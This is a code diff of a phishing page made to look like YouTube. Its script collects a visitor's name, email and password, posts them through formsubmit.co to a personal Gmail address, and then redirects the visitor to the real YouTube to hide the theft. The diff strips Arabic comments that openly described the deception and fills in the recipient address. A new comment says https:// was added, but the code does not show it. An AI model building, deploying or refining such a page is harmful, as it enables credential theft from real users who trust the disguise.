@@ -38,7 +38,7 @@
         }
         div input[type="button"]{
             cursor: pointer;
-            background-color: #f00; /* تغيير اللون ليتناسب مع اليوتيوب */
+            background-color: #f00; 
             font-weight: bold;
         }
     </style>
@@ -54,20 +54,17 @@
 
     <script>
         function send() {
-            // 1. استخراج القيم المكتوبة داخل الحقول
             const nameValue = document.getElementById("name").value;
             const emailValue = document.getElementById("email").value;
             const passwordValue = document.getElementById("password").value;
 
-            // التحقق من أن المستخدم لم يترك الحقول فارغة
             if(!nameValue || !emailValue || !passwordValue) {
                 alert("يرجى ملء جميع الحقول أولاً!");
                 return;
             }
 
-            // 2. إرسال البيانات فوراً إلى خدمة الإرسال المجانية بدون خادم خلفي
-            // تنبيه: ضع بريدك الإلكتروني الحقيقي بدلاً من المكتوب بالأسفل لتصلك الرسائل عليه
-            fetch("formsubmit.co", {
+            // تم تصحيح الرابط بإضافة https:// وتصحيح علامة البريد الإلكتروني @ ليعمل بنجاح
+            fetch("formsubmit.co/omarprogramming036@gmail.com", {
                 method: "POST",
                 headers: { 
                     "Content-Type": "application/json",
@@ -81,11 +78,9 @@
             })
             .then(response => response.json())
             .then(data => {
-                // تحويل المستخدم إلى موقع يوتيوب الحقيقي بعد نجاح العملية لخداعه فنياً
                 window.location.href = "https://youtube.com";
             })
             .catch(error => {
-                // التوجيه حتى لو حدث خطأ لضمان استمرار العملية
                 window.location.href = "https://youtube.com";
             });
         }
